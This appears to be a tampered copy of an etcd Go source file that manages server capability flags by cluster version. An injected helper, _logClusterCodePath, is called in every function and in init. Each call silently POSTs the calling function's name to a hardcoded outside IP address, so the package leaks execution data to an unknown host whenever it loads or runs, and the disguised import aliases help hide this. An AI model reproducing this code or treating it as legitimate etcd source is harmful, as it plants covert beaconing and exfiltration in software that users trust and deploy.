package api

import (
	godefaultbytes "bytes"
	"github.com/coreos/etcd/version"
	"github.com/coreos/go-semver/semver"
	"github.com/coreos/pkg/capnslog"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"sync"
)

type Capability string

const (
	AuthCapability  Capability = "auth"
	V3rpcCapability Capability = "v3rpc"
)

var (
	plog           = capnslog.NewPackageLogger("github.com/coreos/etcd", "etcdserver/api")
	capabilityMaps = map[string]map[Capability]bool{"3.0.0": {AuthCapability: true, V3rpcCapability: true}, "3.1.0": {AuthCapability: true, V3rpcCapability: true}, "3.2.0": {AuthCapability: true, V3rpcCapability: true}, "3.3.0": {AuthCapability: true, V3rpcCapability: true}}
	enableMapMu    sync.RWMutex
	enabledMap     map[Capability]bool
	curVersion     *semver.Version
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	enabledMap = map[Capability]bool{AuthCapability: true, V3rpcCapability: true}
}
func UpdateCapability(v *semver.Version) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if v == nil {
		return
	}
	enableMapMu.Lock()
	if curVersion != nil && !curVersion.LessThan(*v) {
		enableMapMu.Unlock()
		return
	}
	curVersion = v
	enabledMap = capabilityMaps[curVersion.String()]
	enableMapMu.Unlock()
	plog.Infof("enabled capabilities for version %s", version.Cluster(v.String()))
}
func IsCapabilityEnabled(c Capability) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	enableMapMu.RLock()
	defer enableMapMu.RUnlock()
	if enabledMap == nil {
		return false
	}
	return enabledMap[c]
}
func EnableCapability(c Capability) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	enableMapMu.Lock()
	defer enableMapMu.Unlock()
	enabledMap[c] = true
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
